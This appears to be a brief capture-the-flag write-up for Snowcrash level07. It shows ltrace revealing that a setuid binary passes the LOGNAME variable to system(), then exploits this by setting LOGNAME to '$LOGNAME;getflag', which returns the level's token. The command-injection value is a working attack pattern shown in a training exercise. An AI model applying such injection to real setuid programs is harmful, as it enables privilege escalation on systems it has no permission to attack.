# <center>Snowcrash level07</center>

# Explanations

<br/>

## On VM:
> $ ls -l
>> -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07

> $ ltrace ./level07
>> getenv("LOGNAME") = "level07"<br/>
>> system("/bin/echo level07 "level07

- https://fr.wikipedia.org/wiki/Logname

> $ echo $LOGNAME
>> level07

> $ export LOGNAME="$LOGNAME;getflag"
>> level07<br/>
>> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h


